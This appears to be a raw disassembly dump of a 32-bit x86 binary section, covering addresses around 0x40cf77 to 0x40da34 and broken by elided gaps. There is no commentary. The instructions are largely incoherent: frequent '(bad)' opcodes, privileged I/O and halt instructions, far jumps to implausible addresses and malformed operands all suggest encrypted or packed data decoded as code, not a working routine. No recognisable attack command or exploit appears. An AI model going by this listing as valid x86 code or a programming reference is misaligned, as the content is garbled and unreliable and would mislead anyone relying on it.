  40cf77:	mov    esi,DWORD PTR [eax+ecx*1]
  40cf7a:	in     al,0x1
  40cf7c:	xor    ecx,ebx
  40cf7e:	pushf  
  40cf7f:	or     ebp,ecx
  40cf81:	dec    esp
  40cf82:	out    0xeb,al
  40cf84:	push   0xffffffdb
  40cf86:	cmp    dh,0x34
  40cf89:	and    al,0x83
  40cf8b:	leave  
  40cf8c:	gs xchg edx,eax
  40cf8e:	cdq    
  40cf8f:	or     ch,BYTE PTR [ecx-0x5436a0f4]
	...
  40cfbd:	add    BYTE PTR [edi],cl
  40cfbf:	pop    ebx
  40cfc0:	call   DWORD PTR [esp]
  40cfc3:	cmp    DWORD PTR [edi+eax*2-0x56f5668e],0xfffffff3
  40cfcb:	pop    esi
  40cfcc:	leave  
  40cfcd:	add    BYTE PTR [edi+0x48ff006e],al
  40cfd3:	push   0xffffffff
  40cfd5:	jne    0x40d03c
  40cfd7:	xchg   bl,al
  40cfd9:	std    
  40cfda:	mov    dl,0x90
  40cfdc:	or     eax,eax
  40cfde:	pop    eax
  40cfdf:	call   0x9068:0x5e35c2c7
  40cfe6:	push   ebp
  40cfe7:	pop    ds
  40cfe8:	add    BYTE PTR [eax+0x32],ch
  40cfeb:	inc    BYTE PTR [eax+0x0]
  40cfee:	ins    DWORD PTR es:[edi],dx
  40cfef:	dec    esi
  40cff0:	xchg   edx,eax
  40cff1:	call   DWORD PTR [edx+0x65]
  40cff4:	shl    BYTE PTR [ebp+0x2],0x6
  40cff8:	nop
  40cff9:	pusha  
  40cffa:	mov    ah,0x5d
  40cffc:	push   0x1ee2b1
  40d001:	call   0x3ebbf6
  40d006:	(bad)  
  40d007:	popf   
  40d008:	or     eax,0x5f3884
  40d00d:	add    BYTE PTR [eax+0x1b],dl
  40d010:	cld    
  40d011:	push   eax
  40d012:	ror    BYTE PTR [ecx],cl
  40d014:	or     al,0xff
  40d016:	call   0xb5822f08
  40d01b:	fadd   st(2),st
  40d01d:	or     BYTE PTR [esi+0x850d9d],ch
	...
  40d04b:	mov    al,ds:0x5f00005d
  40d050:	pop    edi
  40d051:	lea    eax,[ebp-0x33]
  40d054:	cs push 0xffffffff
  40d057:	in     eax,dx
  40d058:	inc    ebp
  40d059:	popa   
  40d05a:	inc    ecx
  40d05b:	test   DWORD PTR [esi+0x69d2fc73],ecx
  40d061:	cwde   
  40d062:	pusha  
  40d063:	xor    al,0x5f
  40d065:	add    esp,0x79
  40d068:	(bad)  
  40d069:	ror    BYTE PTR [edi],0xf8
  40d06c:	fdivp  st(7),st
  40d06e:	call   FWORD PTR [esp+eax*4]
  40d071:	repz je 0x40d0d8
  40d074:	call   0x42fd6c87
  40d079:	add    al,0x83
  40d07b:	pop    eax
  40d07c:	jg     0x40d0fd
  40d07e:	test   eax,0xb6e8fd97
  40d084:	add    BYTE PTR [edx],0x0
  40d087:	test   eax,0xc64feec6
  40d08c:	xor    ebx,0x74
  40d08f:	and    al,0x1b
  40d091:	adc    bh,bh
  40d093:	and    ebp,DWORD PTR [eax]
  40d095:	or     eax,eax
  40d097:	sub    eax,DWORD PTR [esi]
  40d099:	inc    ebp
  40d09a:	add    DWORD PTR [edx+eax*4],ebx
  40d09d:	jg     0x40d11b
  40d09f:	adc    BYTE PTR [ebx-0x7ca67bfd],al
  40d0a5:	add    al,BYTE PTR [eax]
  40d0a7:	pushf  
  40d0a8:	jp     0x40d0ac
  40d0aa:	sets   BYTE PTR [esi+0x1]
	...
  40d0d5:	add    BYTE PTR [eax],al
  40d0d7:	add    BYTE PTR [edx+edx*8],bl
  40d0da:	xchg   DWORD PTR [eax+ebp*8-0x3c],edx
  40d0de:	push   eax
  40d0df:	call   0xff35d9ec
  40d0e4:	jbe    0x40d0f1
  40d0e6:	aas    
  40d0e7:	call   0xff2fe8b7
  40d0ec:	dec    ecx
  40d0ed:	pop    edx
  40d0ee:	push   edx
  40d0ef:	call   0xff34da43
  40d0f4:	fstp   TBYTE PTR [edi]
  40d0f6:	hlt    
  40d0f7:	jmp    FWORD PTR [ebx+0x59c70282]
  40d0fd:	(bad)  
  40d0fe:	add    al,BYTE PTR [eax]
  40d100:	sbb    al,0x82
  40d102:	jg     0x40d140
  40d104:	les    esp,FWORD PTR [edx]
  40d106:	inc    ebx
  40d107:	add    BYTE PTR [edi+edx*2],bl
  40d10a:	push   edx
  40d10b:	push   0x4323a2
  40d110:	test   BYTE PTR [ebx+0x63],bl
  40d113:	jb     0x40d131
  40d115:	pop    ebx
  40d116:	cmp    DWORD PTR [edx+ecx*4-0x6],ebp
  40d11a:	daa    
  40d11b:	add    al,0x63
  40d11d:	push   cs
  40d11e:	sub    ebx,0x3e90bbd
  40d124:	daa    
  40d125:	fwait
  40d126:	hlt    
  40d127:	sbb    esi,DWORD PTR [ebp+edi*4-0x7ce3bcf9]
  40d12e:	dec    esi
  40d12f:	jb     0x40d14d
  40d131:	pop    ebx
  40d132:	mov    ecx,0xa7fa796b
  40d137:	add    ebp,DWORD PTR [ebx]
  40d139:	push   cs
  40d13a:	inc    ecx
  40d13b:	jmp    0x40d13d
	...
  40d165:	(bad)  [ebx]
  40d167:	jmp    0xbcdbf86f
  40d16c:	dec    ebx
  40d16d:	test   dh,al
  40d16f:	mov    DWORD PTR [edx+0x1c],0x1c726a83
  40d176:	pop    ebx
  40d177:	cdq    
  40d178:	imul   ecx,ecx,0xfffffff9
  40d17b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d17c:	add    esi,ebx
  40d17e:	or     eax,0xc35eb11
  40d183:	jmp    0x6a89c88b
  40d188:	ss test dl,bh
  40d18b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d18c:	add    ebx,DWORD PTR ds:0x926be30e
  40d192:	stc    
  40d193:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d194:	add    esi,DWORD PTR [edi+esi*1+0x2b1c0378]
  40d19b:	push   ecx
  40d19c:	mov    edx,0xf2e91a3c
  40d1a1:	xor    BYTE PTR [ebx+0x5b2f0bc0],al
  40d1a7:	jmp    0x41cf88a
  40d1ac:	pushf  
  40d1ad:	repz sbb ecx,ebp
  40d1b0:	add    eax,0x2005d11
  40d1b5:	pop    eax
  40d1b6:	shl    BYTE PTR fs:[esi+edi*8],0xe5
  40d1bb:	inc    esp
  40d1bc:	popf   
  40d1bd:	enter  0x104,0x9e
  40d1c1:	in     eax,0x92
  40d1c3:	out    0xdc,eax
  40d1c5:	ins    DWORD PTR es:[edi],dx
  40d1c6:	cwde   
  40d1c7:	dec    BYTE PTR [esi+0x0]
	...
  40d1f1:	add    ch,dl
  40d1f3:	mov    cs,WORD PTR [edi-0x6f]
  40d1f6:	call   DWORD PTR [ebp+0x1ec97efe]
  40d1fc:	lock fs aad 0x8e
  40d200:	dec    edi
  40d201:	add    esp,DWORD PTR [edx]
  40d203:	cwde   
  40d204:	je     0x40d267
  40d206:	push   eax
  40d207:	je     0x40d207
  40d209:	pop    esi
  40d20a:	das    
  40d20b:	cwde   
  40d20c:	je     0x40d26b
  40d20e:	enter  0x1482,0x4c
  40d212:	setbe  BYTE PTR [eax+0x7cd9f3ac]
  40d219:	push   ecx
  40d21a:	and    BYTE PTR [edi],cl
  40d21c:	xor    al,0x6a
  40d21e:	lea    eax,[edi+0x33db4ff]
  40d224:	add    cl,ch
  40d226:	(bad)  
  40d227:	fdivr  st,st(6)
  40d229:	xchg   esp,eax
  40d22a:	out    0x7e,eax
  40d22c:	int    0x6b
  40d22e:	out    dx,eax
  40d22f:	xchg   ebp,eax
  40d230:	(bad)  
  40d231:	xchg   esp,eax
  40d232:	not    DWORD PTR [ebp+0x3ff7f174]
  40d238:	cmp    esi,0xffffffce
  40d23b:	xchg   ebp,eax
  40d23c:	je     0x40d237
  40d23e:	into   
  40d23f:	invd   
  40d241:	add    DWORD PTR [edx],ebp
  40d243:	(bad)  
  40d245:	out    0xae,al
  40d247:	paddsb mm3,mm6
  40d24a:	and    al,0x63
  40d24c:	call   0xfed66d37
  40d251:	into   
  40d252:	adc    al,0x8b
  40d254:	out    0x0,eax
	...
  40d27e:	add    cl,dl
  40d280:	jecxz  0x40d27f
  40d282:	dec    edx
  40d284:	adc    ebp,esp
  40d286:	call   0x3eb5e4
  40d28b:	retf   0xe813
  40d28e:	call   0x3eb634
  40d293:	mov    edx,ds
  40d295:	cld    
  40d296:	dec    DWORD PTR [edx-0x55038c77]
  40d29c:	jae    0x40d232
  40d29e:	pusha  
  40d29f:	add    al,0x5f
  40d2a1:	add    esp,0x41
  40d2a4:	mov    dl,0x7f
  40d2a6:	cld    
  40d2a7:	retf   0xc788
  40d2aa:	ret    0x5a55
  40d2ad:	push   ebp
  40d2ae:	mov    ecx,ecx
  40d2b0:	sub    al,0x6a
  40d2b2:	add    dl,cl
  40d2b4:	adc    cl,BYTE PTR [eax]
  40d2b6:	call   0x3eea29
  40d2bb:	jle    0x40d25f
  40d2bd:	push   ecx
  40d2be:	call   0x40dd52
  40d2c3:	push   cs
  40d2c4:	call   0xeb46:0x9cf61b72
  40d2cb:	xlat   BYTE PTR ds:[ebx]
  40d2cc:	fnstenv [esi]
  40d2ce:	or     eax,0x38806291
  40d2d3:	out    dx,eax
  40d2d4:	adc    al,BYTE PTR ds:0xeb59f5c6
  40d2da:	add    bl,BYTE PTR [esi]
  40d2dc:	arpl   WORD PTR [eax+0x3b],cx
  40d2df:	push   es
  40d2e0:	or     eax,0x8bea
	...
  40d309:	add    BYTE PTR [eax],al
  40d30b:	add    dh,dh
  40d30d:	and    al,0xc9
  40d30f:	ret    0x59b1
  40d312:	push   ebp
  40d313:	mov    edi,DWORD PTR [ecx-0xd4b3d21]
  40d319:	mov    esi,DWORD PTR [ebx+0xc]
  40d31c:	int    0x2a
  40d31e:	mov    bh,bh
  40d320:	sbb    al,0xad
  40d322:	cld    
  40d323:	mov    edi,0xc94f7f11
  40d328:	pop    esi
  40d329:	mov    bl,0x2
  40d32b:	call   DWORD PTR [ecx]
  40d32d:	mov    dl,bl
  40d32f:	dec    ebp
  40d330:	mov    al,0xcc
  40d332:	lock or bl,BYTE PTR [edi+ecx*2+0x7]
  40d337:	pop    edi
  40d338:	rcl    DWORD PTR gs:[ebx],0x0
  40d33c:	imul   ebp,DWORD PTR [esi+0x18],0xffffffff
  40d340:	jmp    0x5795add8
  40d345:	in     al,0xf0
  40d347:	mov    ecx,ds
  40d349:	adc    edx,DWORD PTR [edi+edi*8-0x2f]
  40d34d:	xchg   edx,ebx
  40d34f:	icebp  
  40d350:	xchg   esi,eax
  40d351:	or     al,0xf1
  40d353:	or     bl,BYTE PTR [esp+esi*4-0x7a]
  40d357:	pop    es
  40d358:	pop    ds
  40d359:	test   BYTE PTR [edx],al
  40d35b:	push   DWORD PTR [ecx+0x2474f137]
  40d361:	sbb    edi,DWORD PTR [ebx-0x2d9e471]
  40d367:	mov    edi,0x1e00623
  40d36c:	sbb    al,0x82
  40d36e:	jns    0x40d3b4
	...
  40d398:	add    al,dh
  40d39a:	stc    
  40d39b:	jmp    0x40d41c
  40d39d:	cmp    eax,DWORD PTR [edx-0x7f357c01]
  40d3a3:	add    al,BYTE PTR [eax]
  40d3a5:	push   ebx
  40d3a6:	push   0x57
  40d3a8:	jmp    ebx
  40d3aa:	ins    DWORD PTR es:[edi],dx
  40d3ab:	jnp    0x40d3f1
  40d3ad:	in     al,dx
  40d3ae:	gs ja  0x40d381
  40d3b1:	inc    esp
  40d3b2:	jg     0x40d415
  40d3b4:	inc    ecx
  40d3b5:	sbb    al,0x6a
  40d3b7:	gs jo  0x40d3d6
  40d3ba:	adc    BYTE PTR [edx-0x1],0x31
  40d3be:	jb     0x40d41c
  40d3c0:	and    DWORD PTR ds:0xb404285b,edi
  40d3c6:	cs pop ecx
  40d3c8:	add    al,0x1c
  40d3ca:	sub    edx,esi
  40d3cc:	jbe    0x40d43a
  40d3ce:	add    eax,DWORD PTR [ebx+eiz*2]
  40d3d1:	fstp   QWORD PTR [edx-0x2f]
  40d3d4:	dec    eax
  40d3d5:	or     al,0x5b
  40d3d7:	jmp    0xa9a0b929
  40d3dc:	ja     0x40d406
  40d3de:	pusha  
  40d3df:	fwait
  40d3e0:	ja     0x40d406
  40d3e2:	pusha  
  40d3e3:	mov    al,0x0
  40d3e5:	mov    eax,ds:0x1c03eae1
  40d3ea:	pusha  
  40d3eb:	mov    al,ds:0x239c2576
  40d3f0:	mov    eax,0x3e95b1c
  40d3f5:	aaa    
  40d3f6:	pop    esp
  40d3f7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d3f8:	inc    esi
  40d3f9:	mov    BYTE PTR [ebx-0x17],bl
  40d3fc:	add    eax,DWORD PTR [eax]
	...
  40d426:	sbb    al,0x97
  40d428:	mov    ecx,0x659474c3
  40d42d:	lock sub cl,BYTE PTR [ecx+0xe1b2b8e]
  40d434:	jmp    0xe8c43501
  40d439:	add    ebx,DWORD PTR [ebx+ebx*2]
  40d43c:	imul   esi,DWORD PTR [eax],0x4b65641c
  40d442:	push   ds
  40d443:	pop    ebx
  40d444:	jmp    0x2ef4d8a1
  40d449:	lock repnz loope 0x40d3f8
  40d44d:	mov    edi,0x311159e
  40d452:	imul   edi,DWORD PTR [edx],0x1a6aef81
  40d458:	jmp    0x10e81d4d
  40d45d:	call   0xfd2a2f9c
  40d462:	and    DWORD PTR [ebx+0x0],0x6c
  40d466:	sub    DWORD PTR [ecx+0x0],ebx
  40d469:	jmp    0xe928f352
  40d46e:	pop    ds
  40d46f:	pop    ebx
  40d470:	add    al,dl
  40d472:	mov    ds:0x9ee90059,al
  40d477:	push   ss
  40d478:	call   0x89a4e965
  40d47d:	inc    esp
  40d47e:	je     0x40d41c
  40d480:	inc    esp
  40d481:	rcr    DWORD PTR [esi],1
  40d483:	pop    ebx
  40d484:	add    cl,ch
  40d486:	pop    eax
  40d487:	cwde   
  40d488:	add    cl,ch
	...
  40d4b2:	add    BYTE PTR [edi],bl
  40d4b4:	fdivr  DWORD PTR [ecx+edx*4+0x1e]
  40d4b8:	push   cs
  40d4b9:	pshufw mm5,mm5,0x7a
  40d4bd:	(bad)  
  40d4be:	sub    al,0x78
  40d4c0:	pop    eax
  40d4c1:	add    cl,ch
  40d4c3:	pop    ds
  40d4c4:	sub    BYTE PTR [ebp-0x7ca4e018],0xfc
  40d4cb:	addr16 pop eax
  40d4cd:	jne    0x40d4b5
  40d4cf:	mov    eax,0xe5a6dc16
  40d4d4:	add    BYTE PTR [ebx],0xe9
  40d4d7:	pop    ds
  40d4d8:	pop    ebx
  40d4d9:	jmp    0x9bee5e
  40d4de:	push   0xffffff8d
  40d4e0:	add    DWORD PTR [ebx],0xffffffd4
  40d4e3:	adc    ah,ah
  40d4e5:	jl     0x40d508
  40d4e7:	jecxz  0x40d500
  40d4e9:	call   0x9bf4d2
  40d4ee:	inc    eax
  40d4ef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d4f0:	pop    ebx
  40d4f1:	add    cl,ch
  40d4f3:	sahf   
  40d4f4:	psubsb mm5,mm4
  40d4f7:	jmp    0x895b:0x1fe86cd7
  40d4fe:	xchg   esp,eax
  40d4ff:	repz fnstsw WORD PTR [ebp+edx*2+0x18]
  40d504:	pop    es
  40d505:	or     DWORD PTR [eax],eax
  40d507:	cli    
  40d508:	and    ebp,eax
  40d50a:	add    dh,BYTE PTR [ebp-0x3514ffa2]
  40d510:	cdq    
  40d511:	inc    ebx
  40d512:	call   0x4133d2
	...
  40d53f:	add    BYTE PTR [edx+0x23],bh
  40d542:	rol    BYTE PTR [eax],0xb5
  40d545:	pop    esi
  40d546:	add    bh,al
  40d548:	dec    eax
  40d549:	iret   
  40d54a:	(bad)  
  40d54b:	inc    DWORD PTR [ebp-0x46ba38a2]
  40d551:	pop    esi
  40d552:	add    BYTE PTR [eax],al
  40d554:	jne    0x40d4ef
  40d556:	inc    ebx
  40d557:	mov    esp,0x5e85
  40d55c:	mov    edx,0x7500b823
  40d561:	pop    esi
  40d562:	add    bh,bh
  40d564:	or     BYTE PTR [ebx-0x7e4cec1a],al
  40d56a:	std    
  40d56b:	mov    eax,edi
  40d56d:	xchg   esi,eax
  40d56e:	std    
  40d56f:	jne    0x40d4f2
  40d571:	mov    dh,0x6
  40d573:	inc    dl
  40d575:	add    BYTE PTR [edi+0x73817d45],0xd4
  40d57c:	popf   
  40d57d:	mov    edi,ebx
  40d57f:	inc    edx
  40d581:	push   cs
  40d582:	inc    esp
  40d583:	les    esi,FWORD PTR [esi-0x3b9f57b6]
  40d589:	pop    ebp
  40d58a:	add    BYTE PTR [ebp-0x29],dh
  40d58d:	xor    eax,0x5db4619e
  40d592:	call   0x9ea91e
  40d597:	push   eax
  40d598:	fstp   st(7)
  40d59a:	pop    edi
  40d59b:	inc    ecx
  40d59c:	add    eax,0xdc07381
  40d5a1:	jno    0x40d613
	...
  40d5cb:	add    BYTE PTR [eax],al
  40d5cd:	cmc    
  40d5ce:	xchg   esp,eax
  40d5cf:	mov    esi,0x5a8c1c74
  40d5d4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d5d5:	cmp    eax,0x37e802c3
  40d5da:	jmp    0x60a7:0xec6c0002
  40d5e1:	pop    ebp
  40d5e2:	test   ch,ch
  40d5e4:	je     0x40d5c2
  40d5e6:	pop    ebx
  40d5e7:	adc    dh,BYTE PTR [eax+0x1c]
  40d5ea:	test   bh,dh
  40d5ec:	mov    edi,0xad5c7128
  40d5f1:	std    
  40d5f2:	inc    edx
  40d5f3:	add    al,0xe8
  40d5f5:	jecxz  0x40d648
  40d5f7:	add    al,0x0
  40d5f9:	in     al,dx
  40d5fa:	sub    ebx,DWORD PTR [edi-0x147c22a0]
  40d600:	je     0x40d65e
  40d602:	fwait
  40d603:	hlt    
  40d604:	outs   dx,BYTE PTR ds:[esi]
  40d605:	sbb    al,0x84
  40d607:	xlat   BYTE PTR ds:[ebx]
  40d608:	and    al,0x9f
  40d60a:	jbe    0x40d5a6
  40d60c:	pop    edi
  40d60d:	fld    QWORD PTR [ebx+0x5c367501]
  40d613:	mov    dh,0x60
  40d615:	fld    QWORD PTR [ebx-0x7c45d426]
  40d61b:	add    dl,BYTE PTR [eax-0x4c]
  40d61e:	dec    ecx
  40d61f:	arpl   WORD PTR [ecx+0x1c],ax
  40d622:	or     DWORD PTR [edi-0x40],esi
  40d625:	inc    esp
  40d626:	out    0x5c,eax
  40d628:	add    BYTE PTR [ebp*1-0x73a3d4fe],bl
  40d62f:	ret    0x74
	...
  40d65a:	jle    0x40d685
  40d65c:	ja     0x40d626
  40d65e:	add    al,0xb1
  40d660:	pop    esp
  40d661:	add    BYTE PTR [edx+esi*8],bl
  40d664:	jmp    0x40d6da
  40d666:	aam    0x2a
  40d668:	stc    
  40d669:	stc    
  40d66a:	sti    
  40d66b:	dec    ecx
  40d66c:	jnp    0x40d6b2
  40d66e:	mov    al,0x41
  40d670:	ja     0x40d636
  40d672:	hlt    
  40d673:	pop    ebx
  40d674:	and    ebx,DWORD PTR [edi+0x1c]
  40d677:	pop    ebx
  40d678:	mov    ecx,0x9750ec
  40d67d:	cmc    
  40d67e:	aam    0x90
  40d680:	or     eax,0x69d3607b
  40d685:	outs   dx,DWORD PTR ds:[esi]
  40d686:	fcomp  QWORD PTR [ebx+0x75]
  40d689:	aaa    
  40d68a:	lahf   
  40d68b:	push   cs
  40d68c:	xor    DWORD PTR [eax+ebp*1],eax
  40d68f:	inc    ecx
  40d690:	add    DWORD PTR [ebx],0xeca6801c
  40d696:	sub    BYTE PTR [ebx-0x2f],ah
  40d699:	mov    bl,0x1a
  40d69b:	nop
  40d69c:	aad    0xec
  40d69e:	or     BYTE PTR [ebx-0x7ceb8933],bl
  40d6a4:	in     eax,dx
  40d6a5:	add    DWORD PTR [edx-0x47894270],0xffffff90
  40d6ac:	cmp    edi,esp
  40d6ae:	jnp    0x40d63f
  40d6b0:	sub    eax,0x1b906aed
  40d6b5:	lods   al,BYTE PTR ds:[esi]
  40d6b6:	bound  eax,QWORD PTR [esi]
  40d6b8:	icebp  
  40d6b9:	fisttp DWORD PTR [eax+edx*1-0x6a]
  40d6bd:	in     al,dx
	...
  40d6e6:	add    BYTE PTR [edx+0x6],dl
  40d6e9:	test   eax,0x85dd71db
  40d6ee:	in     al,dx
  40d6ef:	inc    edx
  40d6f0:	push   es
  40d6f1:	mov    cl,0xdb
  40d6f3:	imul   ebx,ebp,0x632ec75
  40d6f9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d6fa:	(bad)  [ecx-0x23]
  40d6fd:	gs in  al,dx
  40d6ff:	and    al,BYTE PTR [esi]
  40d701:	popf   
  40d702:	fcmovnu st,st(1)
  40d704:	fcom   QWORD PTR [ebp-0x14]
  40d707:	adc    al,BYTE PTR [esi]
  40d709:	xchg   ecx,eax
  40d70a:	fcmovnbe st,st(1)
  40d70c:	fadd   QWORD PTR [ebp-0x14]
  40d70f:	neg    BYTE PTR [ebp+0x6a]
  40d712:	outs   dx,BYTE PTR ds:[esi]
  40d713:	add    al,0x59
  40d715:	add    BYTE PTR [eax+ebx*1+0x1d414498],bh
  40d71c:	pop    ebx
  40d71d:	add    cl,ch
  40d71f:	pushf  
  40d720:	push   cs
  40d721:	call   0x688c2b0f
  40d726:	adc    eax,0xe001a10
  40d72b:	push   edx
  40d72c:	lahf   
  40d72d:	out    0x11,eax
  40d72f:	bound  ebx,QWORD PTR [ebx+0x0]
  40d732:	repnz fild WORD PTR [esi]
  40d735:	pop    es
  40d736:	cs pop edx
  40d738:	add    DWORD PTR [eax],0xffffffe9
  40d73b:	pop    ds
  40d73c:	pop    ebx
  40d73d:	push   0x1a3983
  40d742:	fimul  WORD PTR ds:0xf5b9e79f
  40d748:	pop    edx
  40d749:	add    dl,ah
	...
  40d773:	add    BYTE PTR [edi+0x6],bl
  40d776:	pop    es
  40d777:	scas   al,BYTE PTR es:[edi]
  40d778:	fld    QWORD PTR [edx+0x5b1fe901]
  40d77e:	(bad)  
  40d77f:	cmp    al,0xb4
  40d781:	ja     0x40d7eb
  40d783:	imul   esi,DWORD PTR [edi-0x70],0xfffffffb
  40d787:	ficomp DWORD PTR [edi-0x2e]
  40d78a:	(bad)  
  40d78b:	sahf   
  40d78c:	inc    edi
  40d78d:	nop
  40d78e:	icebp  
  40d78f:	inc    edi
  40d790:	add    BYTE PTR [eax+0xf],bl
  40d793:	fs xchg edi,eax
  40d795:	mov    ?,esi
  40d797:	xchg   BYTE PTR [edi],dh
  40d799:	push   es
  40d79a:	rcl    BYTE PTR [ecx+0x76fedcf7],1
  40d7a0:	inc    edi
  40d7a1:	push   es
  40d7a2:	in     al,dx
  40d7a3:	sbb    edi,0xa566fedc
  40d7a9:	push   ss
  40d7aa:	lock mov ecx,0x568808f7
  40d7b0:	pop    es
  40d7b1:	ja     0x40d79e
  40d7b3:	push   ecx
  40d7b4:	test   DWORD PTR [ebp-0x6ab3ffa2],0xd90000e
  40d7be:	jmp    0x40d741
  40d7c0:	inc    ecx
  40d7c1:	retf   
  40d7c2:	cld    
  40d7c3:	(bad)  
  40d7c4:	cmp    bl,BYTE PTR [edx-0x7dc4477d]
  40d7ca:	std    
  40d7cb:	add    ch,al
  40d7cd:	pop    edx
  40d7ce:	add    BYTE PTR [ebx-0x3ff4a180],cl
  40d7d4:	mov    cl,0x5b
  40d7d6:	cmp    BYTE PTR [eax],0x0
	...
  40d801:	mov    ch,0xb
  40d803:	add    eax,0x5881e9
  40d808:	add    BYTE PTR [edx-0x7217ebf5],ch
  40d80e:	adc    edi,esi
  40d810:	jmp    FWORD PTR [esi-0x12f08c66]
  40d816:	push   edi
  40d817:	push   eax
  40d818:	inc    ecx
  40d819:	test   DWORD PTR [ecx-0x13a2eb8d],eax
  40d81f:	cmp    edi,0x5a
  40d822:	lods   eax,DWORD PTR ds:[esi]
  40d823:	or     ebp,DWORD PTR [eax-0x7d]
  40d826:	sub    al,BYTE PTR [ecx+0x0]
  40d829:	stos   BYTE PTR es:[edi],al
  40d82a:	or     edx,DWORD PTR [eax+ebp*8]
  40d82d:	add    bl,bl
  40d82f:	std    
  40d830:	(bad)  
  40d831:	in     al,dx
  40d832:	fidiv  DWORD PTR [esi+0x6681bafe]
  40d838:	ds inc esp
  40d83a:	pop    edx
  40d83b:	add    BYTE PTR [ebp-0x36840],cl
  40d841:	call   0xfd80:0xc4ffe82a
  40d848:	(bad)  
  40d849:	rcl    BYTE PTR [edi+0x29bafffc],0xff
  40d850:	mov    ch,0x7d
  40d852:	test   ch,bh
  40d854:	jmp    FWORD PTR [ebp+0x47]
  40d857:	ins    DWORD PTR es:[edi],dx
  40d858:	add    BYTE PTR [esp+eax*4],bl
  40d85b:	jnp    0x40d7e1
  40d85d:	enter  0xea1d,0xfe
  40d861:	pop    esp
  40d862:	test   DWORD PTR [esi-0x1b],edi
	...
  40d88d:	add    BYTE PTR ds:0x898d0284,bl
  40d893:	inc    ecx
  40d894:	jmp    0x585c497
  40d899:	adc    BYTE PTR [esp+eax*4],bl
  40d89c:	add    cl,BYTE PTR [edi]
  40d89e:	mov    al,ds:0x1c000300
  40d8a3:	test   DWORD PTR [esp+ebp*1+0x6c],0x5d4ee6dc
  40d8ab:	test   dl,bl
  40d8ad:	or     DWORD PTR [ecx-0x7c],ecx
  40d8b0:	add    cl,BYTE PTR [ebx]
  40d8b2:	fmul   QWORD PTR [esi]
  40d8b4:	add    cl,ch
  40d8b6:	test   BYTE PTR [edx+0xe910002],al
  40d8bc:	(bad)  
  40d8bd:	std    
  40d8be:	fwait
  40d8bf:	lods   al,BYTE PTR ds:[esi]
  40d8c0:	jbe    0x40d903
  40d8c2:	inc    eax
  40d8c3:	push   esp
  40d8c4:	pop    esp
  40d8c5:	(bad)  
  40d8c6:	fild   DWORD PTR [edx+0x4]
  40d8c9:	call   0x45003f
  40d8ce:	daa    
  40d8cf:	les    ebp,FWORD PTR [esi+0x5]
  40d8d2:	test   DWORD PTR [eax+0x3],ecx
  40d8d5:	add    BYTE PTR [edi*4+0x2f74146e],bl
  40d8dc:	js     0x40d8dc
  40d8de:	pop    ebx
  40d8df:	mov    dl,al
  40d8e1:	je     0x40d906
  40d8e3:	pop    esp
  40d8e4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d8e5:	inc    edi
  40d8e6:	fld    QWORD PTR [ebx-0x13d78b19]
  40d8ec:	cmc    
  40d8ed:	cmp    DWORD PTR [ebx],0xc
  40d8f0:	fisttp QWORD PTR [ecx]
	...
  40d91a:	add    dh,al
  40d91c:	and    edi,0x74
  40d91f:	adc    ah,bl
  40d921:	loope  0x40d8a6
  40d923:	and    ebx,DWORD PTR [edx+0x66]
  40d926:	ja     0x40d8d8
  40d928:	cdq    
  40d929:	pop    esi
  40d92a:	jmp    0x17fbb841
  40d92f:	outs   dx,BYTE PTR ds:[esi]
  40d930:	sub    eax,DWORD PTR [ecx+0x1e]
  40d933:	cdq    
  40d934:	mov    WORD PTR [ebp+0x54],es
  40d937:	dec    esp
  40d938:	mov    WORD PTR [ebx-0x1af90ced],?
  40d93e:	call   0xf5823cb3
  40d943:	loope  0x40d8d1
  40d945:	and    eax,0x1dd9fddc
  40d94a:	jmp    0x4291913
  40d94f:	sbb    al,0xde
  40d951:	stos   BYTE PTR es:[edi],al
  40d952:	pop    ss
  40d953:	xchg   ebp,eax
  40d954:	(bad)  
  40d955:	cmp    al,0xea
  40d957:	mov    edx,0x8427698c
  40d95c:	sti    
  40d95d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d95e:	add    ebx,DWORD PTR [edi]
  40d960:	push   es
  40d961:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d962:	pop    ebx
  40d963:	ret    
  40d964:	sti    
  40d965:	daa    
  40d966:	add    al,0x9b
  40d968:	(bad)  
  40d969:	xchg   esp,eax
  40d96a:	jmp    0x59016601
  40d96f:	stc    
  40d970:	pop    edx
  40d971:	jmp    0x14489d72
  40d976:	pop    esp
  40d977:	mov    ecx,0x73042823
  40d97c:	push   es
  40d97d:	fstp   st(3)
	...
  40d9a7:	add    BYTE PTR [edi+edx*8-0x399d1753],dl
  40d9ae:	pop    esp
  40d9af:	jmp    0xdc79660e
  40d9b4:	ins    BYTE PTR es:[edi],dx
  40d9b5:	xlat   BYTE PTR ds:[ebx]
  40d9b6:	xchg   ebp,eax
  40d9b7:	call   0x428dc97
  40d9bc:	xor    ecx,ebp
  40d9be:	sbb    cl,ch
  40d9c0:	mov    al,0x62
  40d9c2:	xchg   ecx,eax
  40d9c3:	(bad)  
  40d9c4:	jns    0x40d952
  40d9c6:	push   DWORD PTR [ebp+0x47]
  40d9c9:	mov    ds:0x83346e7f,al
  40d9ce:	shr    ecx,cl
  40d9d0:	pop    ds
  40d9d1:	pop    ebx
  40d9d2:	push   0x1a7f51
  40d9d7:	push   esi
  40d9d8:	mov    edx,0xf44efdc7
  40d9dd:	jae    0x40da07
  40d9df:	aam    0x1f
  40d9e1:	pop    ebx
  40d9e2:	or     ebp,DWORD PTR [ecx]
  40d9e4:	cmp    DWORD PTR ds:0x1a277468,0x0
  40d9eb:	cs jb  0x40da55
  40d9ee:	call   0xfece359d
  40d9f3:	push   ds
  40d9f4:	add    bh,0xfd
  40d9f7:	push   ss
  40d9f8:	mov    ah,0x1b
  40d9fa:	call   0xfece1d61
  40d9ff:	cdq    
  40da00:	les    eax,FWORD PTR [esi]
  40da02:	adc    dh,bh
  40da04:	inc    ecx
  40da05:	pop    edi
  40da06:	push   eax
  40da07:	idiv   BYTE PTR [ecx]
  40da09:	arpl   ax,bp
  40da0b:	pop    esp
	...
  40da34:	add    BYTE PTR [edi-0x602e0174],dh
